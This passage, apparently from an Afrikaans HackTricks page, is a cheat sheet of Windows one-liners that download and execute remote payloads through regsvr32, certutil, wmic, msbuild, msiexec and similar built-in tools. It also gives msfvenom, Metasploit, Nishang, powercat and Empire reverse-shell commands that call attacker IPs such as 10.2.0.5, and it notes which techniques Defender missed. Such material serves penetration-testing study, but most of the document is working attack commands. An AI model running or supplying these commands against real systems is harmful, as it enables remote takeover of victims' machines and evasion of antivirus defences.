rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Opgespoor deur verdediger**

#### Regsvr32 -sct

[**Vanaf hier**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLL files. However, it can also be used as a technique for executing malicious code on a target system. In this case, we will explore how to use Regsvr32 with Metasploit to gain remote access to a Windows machine.

##### **Step 1: Generate the Payload**

First, we need to generate a payload using Metasploit. This payload will be executed on the target machine when we run the Regsvr32 command. To generate the payload, open a terminal and enter the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
```

Replace `<attacker IP>` with your IP address and `<attacker port>` with the port you want to use for the connection.

##### **Step 2: Set Up the Listener**

Next, we need to set up a listener in Metasploit to receive the connection from the target machine. Open Metasploit by entering `msfconsole` in the terminal. Once Metasploit is open, enter the following command to set up the listener:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
exploit -j
```

Again, replace `<attacker IP>` and `<attacker port>` with your IP address and the port you specified in Step 1.

##### **Step 3: Execute the Payload**

Now, we are ready to execute the payload on the target machine using the Regsvr32 command. Open a command prompt on the target machine and enter the following command:

```
regsvr32 /s /n /u /i:<payload.dll> scrobj.dll
```

Replace `<payload.dll>` with the path to the payload file generated in Step 1.

Once the command is executed, the payload will be executed on the target machine and a connection will be established with your listener in Metasploit. You will now have remote access to the target machine.

##### **Conclusion**

Using Regsvr32 with Metasploit can be an effective technique for gaining remote access to a Windows machine. However, it is important to note that this technique relies on social engineering or exploiting vulnerabilities to trick the user into executing the command. It is crucial to use this technique responsibly and ethically, and only on systems that you have proper authorization to access.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Jy kan baie maklik 'n Koadic zombie aflaai en uitvoer deur die stager regsvr te gebruik**

## Certutil

* [Vanaf hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

Laai 'n B64dll af, dekodeer dit en voer dit uit.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Laai 'n B64exe af, dekodeer dit en voer dit uit.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Opgespoor deur verdediger**


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is, sodat jy dit vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Metasploit is 'n kragtige raamwerk vir penetrasietoetse en aanvalle. Dit bied 'n verskeidenheid hulpmiddels en modules vir die uitvoer van verskillende aanvalstegnieke. Een van die modules wat in Metasploit beskikbaar is, is die Cscript-module.

Die Cscript-module in Metasploit maak dit moontlik om skadelike kode uit te voer deur gebruik te maak van die Windows Cscript-hulpprogram. Hierdie hulpprogram word gebruik om VBScript- en JScript-lêers uit te voer op Windows-stelsels.

Om die Cscript-module in Metasploit te gebruik, moet jy eers 'n sessie verkry op die teikenstelsel. Jy kan dit doen deur gebruik te maak van 'n ander aanvalstegniek, soos 'n phising-aanval of 'n uitgebuite kwesbaarheid.

As jy 'n sessie het, kan jy die Cscript-module aktiveer deur die `use`-opdrag te gebruik, gevolg deur die `exploit/windows/local/cscript`-opdrag. Hierdie opdrag sal die Cscript-module aktiveer en jou in staat stel om skadelike VBScript- of JScript-lêers uit te voer op die teikenstelsel.

Om 'n skadelike lêer uit te voer, moet jy die `set PAYLOAD`-opdrag gebruik om die tipe skadelike kode te spesifiseer wat jy wil uitvoer. Daarna kan jy die `set SCRIPT`-opdrag gebruik om die pad na die VBScript- of JScript-lêer te spesifiseer wat jy wil uitvoer.

Nadat jy die nodige instellings gemaak het, kan jy die `exploit`-opdrag gebruik om die skadelike kode uit te voer. As alles suksesvol verloop, sal die skadelike kode uitgevoer word op die teikenstelsel en kan jy toegang verkry tot die stelsel of verdere aanvalle uitvoer.

Dit is belangrik om te onthou dat die gebruik van die Cscript-module in Metasploit 'n aanvalstegniek is wat slegs gebruik moet word met toestemming van die eienaar van die stelsel wat getoets word. Misbruik van hierdie tegniek kan wettige gevolge hê.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Opgevang deur verdediger**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Proses wat netwerkoproep uitvoer: **svchost.exe**\
Payload geskryf op skyf: **WebDAV-kliënt plaaslike kas**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Opgevang deur verdediger**

## **MSIExec**

Aanvaller
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Slagoffer:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Opgespoor**

## **Wmic**

* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Voorbeeld xsl-lêer [van hier](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Nie opgespoor nie**

**Jy kan baie maklik 'n Koadic zombie aflaai en uitvoer deur die stager wmic te gebruik**

## Msbuild

* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Jy kan hierdie tegniek gebruik om Toepassing Witlysing en Powershell.exe beperkings te omseil. Jy sal geprompt word met 'n PS-skyf.\
Net aflaai en uitvoer: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Nie opgespoor nie**

## **CSC**

Kompileer C#-kode in die slagoffer se masjien.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Jy kan 'n basiese C# omgekeerde dop vanaf hier aflaai: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Nie opgespoor nie**

## **Regasm/Regsvc**

* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Ek het dit nog nie probeer nie**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Ek het dit nog nie probeer nie**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell Skulpe

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

In die **Shells**-map, is daar baie verskillende skulpe. Om Invoke-_PowerShellTcp.ps1_ af te laai en uit te voer, maak 'n kopie van die skrip en voeg dit aan die einde van die lêer by:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Begin deur die skripsie in 'n webbediener te bedien en voer dit uit aan die slagoffer se kant:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Verdediger beskou dit nie as skadelike kode nie (nog nie, 3/04/2019).

**TODO: Kontroleer ander nishang skulpe**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Laai af, begin 'n webbediener, begin die luisteraar en voer dit uit aan die slagoffer se kant:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Verdediger bespeur dit nie as skadelike kode nie (nog nie, 3/04/2019).

**Ander opsies wat deur powercat aangebied word:**

Bind skulpe, Omgekeerde skulp (TCP, UDP, DNS), Poort omleiding, oplaai/afhaal, Genereer vragte, Bedien lêers...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Skep 'n PowerShell-aanroeper, stoor dit in 'n lêer en laai dit af en voer dit uit.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Opgelet: Hierdie kode word as skadelik beskou**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Skep 'n PowerShell-weergawe van die Metasploit-agterdeur deur gebruik te maak van unicorn.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Begin msfconsole met die geskepte bron:
```
msfconsole -r unicorn.rc
```
Begin deur 'n webbediener te begin wat die _powershell\_attack.txt_ lêer bedien en voer dit uit op die slagoffer:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Opgelet: Hierdie kode is as skadelik geïdentifiseer**

## Meer

[PS>Aanval](https://github.com/jaredhaight/PSAttack) PS-konsole met 'n paar aanvallende PS-modules vooraf gelaai (gekodeer)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsole met 'n paar aanvallende PS-modules en proksi-opsporing (IEX)

## Verwysings

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regstel. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
